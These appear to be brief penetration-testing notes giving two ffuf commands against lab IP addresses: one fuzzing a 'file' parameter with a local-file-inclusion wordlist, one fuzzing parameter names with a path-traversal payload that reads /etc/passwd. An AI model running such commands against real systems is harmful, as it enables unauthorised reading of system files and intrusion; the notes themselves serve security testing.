LFI fuzzing:
ffuf -u '<https://172.31.3.1/forum.chatlogs/chatlogs.php?file=FUZZ'> -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

Fuzzing paramaters:
ffuf -u '<http://10.11.1.123/books/LIB/model/db.php?FUZZ=../../../../../../../../etc/passwd'> -w ./LFI-params.txt -fs 0

